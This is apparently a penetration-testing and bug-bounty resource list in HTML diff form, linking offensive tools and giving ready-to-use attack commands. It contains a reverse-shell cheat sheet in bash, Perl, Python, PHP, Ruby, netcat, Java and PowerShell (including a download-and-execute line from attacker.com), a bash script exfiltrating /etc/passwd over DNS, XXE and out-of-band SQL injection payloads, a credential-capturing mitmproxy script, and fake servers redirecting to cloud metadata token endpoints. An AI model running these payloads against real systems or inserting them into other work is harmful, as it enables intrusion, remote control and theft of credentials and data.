+<p>https://www.openwall.com/john/
+ * John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.
+<code>unshadow /etc/passwd /etc/shadow &gt; mypasswd.</code>
+<code>john mypasswd.</code></p>
+<p>https://hashcat.net/hashcat/
+ * Hashcat is a password recovery tool.
+<code>hashcat -m 0 -a 0 hashes. passwords.</code></p>
+<p>https://github.com/iangcarroll/cookiemonster
+ * CookieMonster is a command-line tool and API for decoding and modifying vulnerable session cookies from several different frameworks. It is designed to run in automation pipelines which must be able to efficiently process a large amount of these cookies to quickly discover vulnerabilities. Additionally, CookieMonster is extensible and can easily support new cookie formats.
+<code>cookiemonster -cookie "gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1mgnkC:z5yDxzI06qYVAU3bkLaWYpADT4I"</code></p>
+<p>https://github.com/ticarpi/jwt_tool
+ * jwt_tool.py is a toolkit for validating, forging, scanning and tampering JWTs (JSON Web Tokens).
+<code>python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw</code></p>
+<p>https://github.com/ustayready/fireprox
+ * Rotate the source IP address in order to bypass rate limits</p>
+<h2 id="exfiltration">Exfiltration</h2>
+<p>https://github.com/vp777/procrustes
+ * A bash script that automates the exfiltration of data over dns</p>
+<p>https://github.com/sensepost/reGeorg
+ * The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.</p>
+<p>https://github.com/fbkcs/ThunderDNS
+ * This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.</p>
+<p>https://github.com/BishopFox/sliver
+ * Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. Sliver's implants support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS and are dynamically compiled with per-binary asymmetric encryption keys.</p>
+<p>https://github.com/rapid7/metasploit-framework
+ * The Metasploit Framework (MSF) is far more than just a collection of exploits–it is also a solid foundation that you can build upon and easily customize to meet your needs.</p>
+<p>https://cloud.hacktricks.xyz/pentesting-cloud/gcp-pentesting/gcp-services/gcp-databases-enum/gcp-firebase-enum
+https://blog.assetnote.io/bug-bounty/2020/02/01/expanding-attack-surface-react-native/
+ * Extract data from Firebase with apikey.
+`
+$ python3 -m venv venv
+$ source venv/bin/activate
+$ python3 -m ensurepip
+$ pip3 install pyrebase4
+$ python3</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>import pyrebase
+config = {"apiKey":"AIz...","authDomain":"project.firebaseapp.com","databaseURL":"https://project.firebaseio.com"...}
+firebase = pyrebase.initialize_app(config)
+db = firebase.database()
+print(db.get())
+`</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li>Pure bash exfiltration over dns</li>
+</ul>
+<h1 id="execute-on-target-server-replace-yourbcid">* Execute on target server (replace YOURBCID)</h1>
+<p><code>CMD="cat /etc/passwd"
+HID=$(tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 5)
+CMDID=$(tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 5)
+BC="YOURBCID.burpcollaborator.net"
+D="$HID-$CMDID.$BC"
+M=$($CMD 2&gt;&amp;1); T=${#M}; O=0; S=30; I=1; while [ "${T}" -gt "0" ]; do C=$(echo ${M:${O}:${S}}|base64); C=${C//+/_0}; C=${C//\//_1}; C=${C//=/_2}; host -t A $I.${C}.$D&amp;&gt;/dev/null; O=$((${O}+${S})); T=$((${T}-${S})); I=$((I+1)); done</code></p>
+<h1 id="execute-on-attacker-machine-replace-yourbiid-and-extract-burp-collaborator-results">* Execute on attacker machine (replace YOURBIID) and extract Burp Collaborator results</h1>
+<p><code>BCPURL="https://polling.burpcollaborator.net/burpresults?biid=YOURBIID"
+RESULTS=$(curl -sk "${BCPURL}")</code></p>
+<h1 id="get-ids-available">* Get IDs available</h1>
+<p><code>echo "${RESULTS}" | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'"protocol":"dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep --color=never "^[[:digit:]]+\..*\..*\.$BC$"; fi; done | sed -r 's/^[[:digit:]]+\.[^.]+\.([^.]+)\..*/\1/g' | sort -u</code></p>
+<h1 id="update-id-and-get-command-result-repeat-for-each-id">* Update ID and get command result (repeat for each ID)</h1>
+<p><code>ID="xxxxx-xxxxx"
+echo "${RESULTS}" | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'"protocol":"dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep "^[[:digit:]]+\..*\..*\.$BC$"; fi; done | egrep "$ID" | sort -t. -k3 -g | sed -r 's/^[[:digit:]]+\.([^.]+)\..*/\1/g' | while read i; do i=${i//_0/+}; i=${i//_1/\/}; i=${i//_2/=}; echo ${i} | base64 -d; done</code></p>
+<p>https://www.slideshare.net/snyff/code-that-gets-you-pwnsd
+ * Code that gets you pwn(s|'d). Very intersting bypasses ideas.</p>
+<h2 id="general_1">General</h2>
+<p>https://github.com/firefart/stunner
+ * Stunner is a tool to test and exploit STUN, TURN and TURN over TCP servers. TURN is a protocol mostly used in videoconferencing and audio chats (WebRTC).
+<code>stunner info -s x.x.x.x:443</code></p>
+<h1 id="manual">* Manual</h1>
+<h2 id="payloads">Payloads</h2>
+<p>https://github.com/six2dez/OneListForAll
+ * This is a project to generate huge wordlists for web fuzzing, if you just want to fuzz with a good wordlist use the file onelistforallmicro..</p>
+<p>https://github.com/swisskyrepo/PayloadsAllTheThings
+ * PayloadsAllTheThings</p>
+<p>https://github.com/RenwaX23/XSS-Payloads
+ * List of XSS Vectors/Payloads i have been collecting since 2015 from different resources like websites,tweets,books.</p>
+<p>https://github.com/0xacb/recollapse
+ * REcollapse is a helper tool for black-box regex fuzzing to bypass validations and discover normalizations in web applications.</p>
+<p>https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
+ * Unicode normalization good for WAF bypass.</p>
+<p>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+ * This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or browser and a proof of concept is included for every vector.</p>
+<p>https://portswigger.net/web-security/xxe
+ * XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
+<code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code>
+<code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</code>
+<code>&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</code></p>
+<p>https://phonexicum.github.io/infosec/xxe.html
+ * Information Security PENTEST XXE
+<code>&lt;!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd"&gt;</code></p>
+<p>https://github.com/GoSecure/dtd-finder
+ * Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.</p>
+<p>https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages
+ * We propose a new exploit technique that brings a whole-new attack surface to bypass SSRF (Server Side Request Forgery) protections.
+https://github.com/orangetw/Tiny-URL-Fuzzer/blob/master/samples.</p>
+<h2 id="bypass">Bypass</h2>
+<p>https://blog.ryanjarv.sh/2022/03/16/bypassing-wafs-with-alternate-domain-routing.html
+ * Bypassing CDN WAF’s with Alternate Domain Routing</p>
+<p>https://bishopfox.com/blog/json-interoperability-vulnerabilities
+ * The same JSON document can be parsed with different values across microservices, leading to a variety of potential security risks.</p>
+<p>https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
+ * Browsers support internetionalized domains, but some Unicode characters are converted into English letters and symbols. This may be useful to make very short domains or bypass SSRF protection.</p>
+<p>https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
+ * It’s hard to overstate the severity of this bug. If you are using ECDSA signatures for any of these security mechanisms, then an attacker can trivially and completely bypass them if your server is running any Java 15, 16, 17, or 18 version before the April 2022 Critical Patch Update (CPU). For context, almost all WebAuthn/FIDO devices in the real world (including Yubikeys) use ECDSA signatures and many OIDC providers use ECDSA-signed JWTs.</p>
+<p>https://h.43z.one/ipconverter/
+ * Convert IP address to different formats for bypass.</p>
+<p>https://github.com/aufzayed/bugbounty/tree/main/403-bypass
+ * Common 403 bypass.</p>
+<p>https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies
+ * In this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers.</p>
+<p>https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/
+ * The cookieless feature of .NET Framework could be abused to access protected directories or those blocked by URL filters in IIS.</p>
+<h2 id="deserialization">Deserialization</h2>
+<p>https://github.com/joaomatosf/jexboss
+ * JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.</p>
+<p>https://github.com/pimps/JNDI-Exploit-Kit
+ * This is a forked modified version of the great exploitation tool created by @welk1n (https://github.com/welk1n/JNDI-Injection-Exploit). </p>
+<h2 id="ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery)</h2>
+<p>https://lab.wallarm.com/blind-ssrf-exploitation/
+ * There is such a thing as SSRF. There’s lots of information about it, but here is my quick summary.</p>
+<p>https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
+ * A Glossary of Blind SSRF Chains.</p>
+<p>https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/
+ * BRING YOUR OWN SSRF – THE GATEWAY ACTUATOR.</p>
+<p>https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/
+ * Attacking Java RMI via SSRF.</p>
+<p>https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next
+ * Got SSRF in a AWS lambda?
+<code>http://localhost:9001/2018-06-01/runtime/invocation/next</code></p>
+<h2 id="oauth">OAuth</h2>
+<p>https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
+ * In this article, we will be focusing on the most common flow that you will come across today, which is the OAuth 2.0 authorization code grant type.</p>
+<p>https://portswigger.net/web-security/oauth
+ * In this section, we'll teach you how to identify and exploit some of the key vulnerabilities found in OAuth 2.0 authentication mechanisms.</p>
+<p>https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts
+ * Hackers could take over millions of accounts on Grammarly, Vidio and Bukalapak.</p>
+<h2 id="dns-rebinding">DNS Rebinding</h2>
+<p>https://github.com/nccgroup/singularity
+ * Singularity of Origin is a tool to perform DNS rebinding attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack payloads to exploit vulnerable software on the target machine.</p>
+<p>https://github.com/brannondorsey/dns-rebind-toolkit
+ * DNS Rebind Toolkit is a frontend JavaScript framework for developing DNS Rebinding exploits against vulnerable hosts and services on a local area network (LAN).</p>
+<p>https://github.com/brannondorsey/whonow
+ * A malicious DNS server for executing DNS Rebinding attacks on the fly.</p>
+<p>https://nip.io
+ * Dead simple wildcard DNS for any IP Address</p>
+<p>https://sslip.io
+ * sslip.io is a DNS (Domain Name System) service that, when queried with a hostname with an embedded IP address, returns that IP Address.</p>
+<p>http://1u.ms/
+ * This is a small set of zero-configuration DNS utilities for assisting in detection and exploitation of SSRF-related vulnerabilities. It provides easy to use DNS rebinding utility, as well as a way to get resolvable resource records with any given contents.</p>
+<p>https://github.com/Rhynorater/rebindMultiA
+ * rebindMultiA is a tool to perform a Multiple A Record rebind attack.</p>
+<h2 id="smtp-header-injection">SMTP Header Injection</h2>
+<p>https://www.acunetix.com/blog/articles/email-header-injection/
+ * It is common practice for web pages and web applications to implement contact forms, which in turn send email messages to the intended recipients. Most of the time, such contact forms set headers. These headers are interpreted by the email library on the web server and turned into resulting SMTP commands, which are then processed by the SMTP server.
+<code>POST /contact.php HTTP/1.1</code>
+<code>Host: www.example2.com</code>
+<code></code>
+<code>name=Best Product\nbcc: everyone@example3.com&amp;replyTo=blame_anna@example.com&amp;message=Buy my product!</code></p>
+<h2 id="web-shell">Web Shell</h2>
+<p>https://www.kali.org/tools/webshells/
+ * A collection of webshells for ASP, ASPX, CFM, JSP, Perl, and PHP servers.</p>
+<h2 id="reverse-shell">Reverse Shell</h2>
+<p>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+ * If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.
+ * Bash
+<code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p>
+<ul>
+<li>
+<p>PERL
+<code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></p>
+</li>
+<li>
+<p>Python
+<code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>
+</li>
+<li>
+<p>PHP
+<code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>
+</li>
+<li>
+<p>Ruby
+<code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</code></p>
+</li>
+<li>
+<p>Netcat
+<code>nc -e /bin/sh 10.0.0.1 1234</code>
+<code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code></p>
+</li>
+<li>
+<p>Java
+<code>r = Runtime.getRuntime()</code>
+<code>p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])</code>
+<code>p.waitFor()</code></p>
+</li>
+<li>
+<p>xterm
+<code>xterm -display 10.0.0.1:1</code>
+<code>Xnest :1</code>
+<code>xhost +targetip</code></p>
+</li>
+<li>
+<p>powershell (without download)
+<code>echo IEX(New-Object Net.WebClient).DownloadString("http://attacker.com:8442/powercat.ps1") | powershell -noprofile; powercat -c attacker.com -p 8443 -e cmd</code></p>
+</li>
+</ul>
+<p>https://reverse-shell.sh/
+ * Reverse Shell as a Service
+<code>nc -l 1337</code>
+<code>curl https://reverse-shell.sh/yourip:1337 | sh</code></p>
+<p>https://github.com/calebstewart/pwncat
+ * pwncat is a post-exploitation platform for Linux targets.</p>
+<h2 id="sqli-sql-injection_1">SQLi (SQL Injection)</h2>
+<p>https://arxiv.org/abs/1303.3047
+ * This paper describes an advanced SQL injection technique where DNS resolution process is exploited for retrieval of malicious SQL query results.</p>
+<p>https://livesql.oracle.com
+ * Learn and share SQL. Running on Oracle Database 19c.</p>
+<p>https://www.db-fiddle.com
+ * An online SQL database playground for testing, debugging and sharing SQL snippets.</p>
+<p>http://sqlfiddle.com/
+ * Application for testing and sharing SQL queries.</p>
+<ul>
+<li>
+<p>Oracle
+<code>'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'</code>
+<code>'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'</code>
+<code>'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'</code>
+<code>'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'</code></p>
+</li>
+<li>
+<p>MySQL
+<code>'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'</code></p>
+</li>
+<li>
+<p>Microsoft SQL Server
+<code>'+;EXEC('master..xp_dirtree"\\xpto.example.com\"');+'</code>
+<code>'+;EXEC('master..xp_fileexist"\\xpto.example.com\"');+'</code>
+<code>'+;EXEC('master..xp_subdirs"\\xpto.example.com\"');+'</code></p>
+</li>
+<li>
+<p>PostgreSQL
+<code>'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'</code></p>
+</li>
+</ul>
+<p>https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
+ * This repository contains a advanced methodology of all types of SQL Injection.</p>
+<p>https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+ * This SQL injection cheat sheet is an updated version of a 2007 post by Ferruh Mavituna on his personal blog. Currently this SQL injection cheat sheet only contains information for MySQL, Microsoft SQL Server, and some limited information for ORACLE and PostgreSQL SQL servers. Some of the samples in this sheet might not work in every situation because real live environments may vary depending on the usage of parentheses, different code bases and unexpected, strange and complex SQL sentences.</p>
+<p>https://www.websec.ca/kb/sql_injection
+ * The SQL Injection Knowledge Base</p>
+<p>https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+ * Use our SQL Injection Cheat Sheet to learn about the different variants of the SQL injection vulnerability.</p>
+<h2 id="xss_1">XSS</h2>
+<p>https://rhynorater.github.io/postMessage-Braindump
+ * postMessage-related bugs have landed me some serious bounties during the past couple live hacking events. Here is a quick summary of what you need to know about postMessage.</p>
+<p>https://www.gremwell.com/firefox-xss-302
+ * Forcing Firefox to Execute XSS Payloads during 302 Redirects.</p>
+<p>https://trufflesecurity.com/blog/xsshunter/
+ * Truffle Security is proud to host a new XSSHunter.</p>
+<h2 id="xpath-injection">XPath Injection</h2>
+<p>https://book.hacktricks.xyz/pentesting-web/xpath-injection
+ * XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.</p>
+<p>https://devhints.io/xpath
+ * Xpath cheatsheet.</p>
+<p>https://www.s4msecurity.com/2022/06/08/xml-xpath-injection-search-bwapp-level-low/
+ * This article subject XML/XPath Injection vulnerability on web app.</p>
+<h2 id="lfi-local-file-inclusion">LFI (Local File Inclusion)</h2>
+<p>https://bierbaumer.net/security/php-lfi-with-nginx-assistance/
+ * This post presents a new method to exploit local file inclusion (LFI) vulnerabilities in utmost generality, assuming only that PHP is running in combination with Nginx under a common standard configuration.</p>
+<h2 id="ssti-server-side-template-injection">SSTI (Server Side Template Injection)</h2>
+<p>https://www.youtube.com/watch?v=SN6EVIG4c-0
+ * Template Injections (SSTI) in 10 minutes</p>
+<p>https://portswigger.net/research/server-side-template-injection
+ * Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.</p>
+<p>https://github.com/epinna/tplmap
+ * Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system.
+<code>tplmap.py --os-shell -u 'http://www.example.com/page?name=John'</code></p>
+<p>https://github.com/vladko312/SSTImap
+ * SSTImap is a penetration testing software that can check websites for Code Injection and Server-Side Template Injection vulnerabilities and exploit them, giving access to the operating system itself.
+<code>sstimap.py -u https://example.com/page?name=John</code></p>
+<h2 id="information-disclosure">Information Disclosure</h2>
+<p>https://infosecwriteups.com/information-disclosure-vulnerability-in-adobe-experience-manager-affecting-multiple-companies-2fb0558cd957
+<code>https://www.example.com/content/example/filename.pdf/.1.json</code></p>
+<h2 id="webdav-web-distributed-authoring-and-versioning">WebDAV (Web Distributed Authoring and Versioning)</h2>
+<p>http://www.webdav.org/cadaver/
+ * cadaver is a command-line WebDAV client for Unix.</p>
+<p>https://github.com/cldrn/davtest
+ * This program attempts to exploit WebDAV enabled servers.</p>
+<h2 id="generic-tools">Generic Tools</h2>
+<p>https://ahrefs.com/backlink-checker
+ * Try the free version of Ahrefs' Backlink Checker.</p>
+<p>https://gchq.github.io/CyberChef/
+ * The Cyber Swiss Army Knife</p>
+<p>https://github.com/securisec/chepy
+ * Chepy is a python lib/cli equivalent of the awesome CyberChef tool.</p>
+<p>https://packettotal.com/
+ * Pcap analysis and samples</p>
+<p>https://github.com/vavkamil/awesome-bugbounty-tools
+ * A curated list of various bug bounty tools.</p>
+<p>https://check-host.net/
+ * Check-Host is a modern online tool for website monitoring and checking availability of hosts, DNS records, IP addresses.</p>
+<p>https://github.com/fyoorer/ShadowClone
+ * ShadowClone allows you to distribute your long running tasks dynamically across thousands of serverless functions and gives you the results within seconds where it would have taken hours to complete.</p>
+<p>https://github.com/A-poc/RedTeam-Tools
+ * This github repository contains a collection of 125+ tools and resources that can be useful for red teaming activities.</p>
+<p>https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md
+ * All Atomic Tests by ATT&amp;CK Tactic &amp; Technique (https://atomicredteam.io/atomics/).</p>
+<p>https://github.com/fransr/unpack-burp
+ * This is a small tool created by Frans Rosén. For unpacking base64:ed "Save items"-content from Burp.</p>
+<p>https://github.com/codingo/Interlace
+ * Easily turn single threaded command line applications into a fast, multi-threaded application with CIDR and glob support.</p>
+<h1 id="ai">* AI</h1>
+<p>https://portswigger.net/web-security/llm-attacks
+ * Organizations are rushing to integrate Large Language Models (LLMs) in order to improve their online customer experience. This exposes them to web LLM attacks that take advantage of the model's access to data, APIs, or user information that an attacker cannot access directly.</p>
+<p>https://owasp.org/www-project-top-10-for-large-language-model-applications/
+ * The OWASP Top 10 for Large Language Model Applications project aims to educate developers, designers, architects, managers, and organizations about the potential security risks when deploying and managing Large Language Models (LLMs).</p>
+<p>https://github.com/protectai/ai-exploits
+ * The AI world has a security problem and it's not just in the inputs given to LLMs such as ChatGPT. Based on research done by Protect AI and independent security experts on the Huntr Bug Bounty Platform, there are far more impactful and practical attacks against the tools, libraries and frameworks used to build, train, and deploy machine learning models.</p>
+<h1 id="general_2">* General</h1>
+<ul>
+<li>
+<p>Print only response headers for any method with curl
+<code>curl -skSL -D - https://www.example.com -o /dev/null</code></p>
+</li>
+<li>
+<p>Extract website certificate
+<code>true | openssl s_client -connect www.example.com:443 2&gt;/dev/null | openssl x509 -noout -text</code></p>
+</li>
+<li>
+<p>Pure bash multhread script
+`</p>
+</li>
+</ul>
+<h1 id="binbash">!/bin/bash</h1>
+<p>FILE="${1}"
+THREADS="${2}"
+TIMEOUT="${3}"
+CMD="${4}"
+NUM=$(wc -l ${FILE} | awk '{ print $1 }')
+THREAD=0
+NUMDOM=0
+while read SUBDOMAIN; do
+        PIDSTAT=0
+        if [ $THREAD -lt $THREADS ]; then
+                eval timeout ${TIMEOUT} ${CMD} 2&gt;/dev/null &amp;
+                PIDS[$THREAD]="${!}"
+                let THREAD++
+                let NUMDOM++
+                echo -ne "\r&gt;Progress: ${NUMDOM} of ${NUM} ($(awk "BEGIN {printf \"%0.2f\",(${NUMDOM}<em>100)/${NUM}}")%)\r"
+        else
+                while [ ${PIDSTAT} -eq 0 ]; do
+                        for j in "${!PIDS[@]}"; do
+                                kill -0 "${PIDS[j]}" &gt; /dev/null 2&gt;&amp;1
+                                PIDSTAT="${?}"
+                                if [ ${PIDSTAT} -ne 0 ]; then
+                                        eval timeout ${TIMEOUT} ${CMD} 2&gt;/dev/null &amp;
+                                        PIDS[j]="${!}"
+                                        let NUMDOM++
+                                        echo -ne "\r&gt;Progress: ${NUMDOM} of ${NUM} ($(awk "BEGIN {printf \"%0.2f\",(${NUMDOM}</em>100)/${NUM}}")%)\r"
+                                        break
+                                fi
+                        done
+                done
+        fi
+done &lt; ${FILE}
+wait
+`</p>
+<ul>
+<li>Reverse Proxy (mitmproxy)
+<code>mitmdump --certs ~/cert/cert.pem --listen-port 443 --scripts script.py --set block_global=false --mode reverse:https://example.com/</code>  * Good for capture credentials
+`
+$ cat script.py
+import mitmproxy.http
+from mitmproxy import ctx</li>
+</ul>
+<p>def request(flow):
+    if flow.request.method == "POST":
+        ctx.log.info(flow.request.get_text())
+        f = open("captured.log", "a")
+        f.write(flow.request.get_text() + '\n')
+        f.close()
+`</p>
+<ul>
+<li>
+<p>Port Forwarding (socat)
+<code>sudo socat -v TCP-LISTEN:80,fork TCP:127.0.0.1:81</code></p>
+</li>
+<li>
+<p>Reverse Proxy (socat)
+<code>socat -v -d -d TCP-LISTEN:8101,reuseaddr,fork TCP:127.0.0.1:8100</code>
+<code>sudo socat -v -d -d openssl-listen:8443,cert=cert.pem,reuseaddr,fork,verify=0 SSL:127.0.0.1:443,verify=0</code></p>
+</li>
+<li>
+<p>SOCKS Proxy
+<code>ssh -N -D 0.0.0.0:1337 localhost</code></p>
+</li>
+</ul>
+<p>https://github.com/projectdiscovery/proxify/
+ * Swiss Army Knife Proxy for rapid deployments. Supports multiple operations such as request/response dump, filtering and manipulation via DSL language, upstream HTTP/Socks5 proxy.
+<code>proxify -socks5-proxy socks5://127.0.0.1:9050</code></p>
+<ul>
+<li>
+<p>Fake HTTP Server
+<code>while true ; do echo -e "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 2\r\n\r\nOK" | sudo nc -vlp 80; done</code>
+<code>socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Connection: close";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'</code>
+<code>socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'</code>
+<code>FILE=image.jpg;socat -v -d -d TCP-LISTEN:80,fork "SYSTEM:/bin/echo 'HTTP/1.1 200 OK';/bin/echo 'Content-Length: '</code>wc -c&lt;$FILE<code>;/bin/echo 'Content-Type: image/png';/bin/echo;dd 2&gt;/dev/null&lt;$FILE"</code>  * Present an image
+<code>python2 -m SimpleHTTPServer 8080</code>
+<code>python3 -m http.server 8080</code>
+<code>php -S 0.0.0.0:80</code>
+<code>ruby -run -e httpd . -p 80</code>
+<code>busybox httpd -f -p 80</code></p>
+</li>
+<li>
+<p>Fake HTTPS Server
+<code>openssl req -new -x509 -keyout test.key -out test.crt -nodes</code>
+<code>cat test.key test.crt &gt; test.pem</code>
+<code>socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=test.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Connection: close";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'</code>
+<code>socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=web.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Connection: close";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'</code>
+<code>stunnel stunnel.conf</code>  * Check https://www.stunnel.org/</p>
+</li>
+<li>
+<p>Python 3 Simple HTTPS Server
+<code>import http.server, ssl
+    server_address = ('0.0.0.0', 443)
+    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
+    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='/path/cert.pem', ssl_version=ssl.PROTOCOL_TLS)
+    httpd.serve_forever()</code></p>
+</li>
+<li>
+<p>Fake FTP Server
+<code>python -m pyftpdlib --directory=/tmp/dir/ --port=21</code></p>
+</li>
+<li>
+<p>Check HTTP or HTTPS
+<code>while read i; do curl -m 15 -ki http://$i &amp;&gt; /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done &lt; subdomains.</code>
+<code>while read i; do curl -m 15 -ki https://$i &amp;&gt; /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done &lt; subdomains.</code></p>
+</li>
+<li>
+<p>Ten requests in parallel
+<code>xargs -I % -P 10 curl -H 'Connection: close' -s -D - -o /dev/null https://example.com &lt; &lt;(printf '%s\n' {1..10000})</code></p>
+</li>
+<li>
+<p>Access target directly through IP address
+<code>http://1.2.3.4</code>
+<code>https://1.2.3.4</code></p>
+</li>
+<li>
+<p>Trim space and newlines on bash variable
+<code>"${i//[$'\t\r\n ']}"</code></p>
+</li>
+<li>
+<p>Extract paths from swagger.json
+<code>cat swagger.json | jq -r '.paths | to_entries[] | .key'</code></p>
+</li>
+<li>
+<p>Free SMS online services
+https://receive-sms.cc
+https://onlinesim.io</p>
+</li>
+</ul>
+<p>https://gtfobins.github.io/
+ * GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.</p>
+<p>https://www.guyrutenberg.com/2014/05/02/make-offline-mirror-of-a-site-using-wget/
+ * Make Offline Mirror of a Site using wget
+<code>wget -mkEpnp https://www.example.com/</code></p>
+<ul>
+<li>Referer spoofing
+<code>&lt;base href="https://www.google.com/"&gt;</code>
+<code>&lt;style&gt;</code>
+<code>@import 'https://CSRF.vulnerable.example/';</code>
+<code>&lt;/style&gt;</code></li>
+</ul>
+<p>https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
+ * Check PreAuth RCE on Palo Alto GlobalProtect
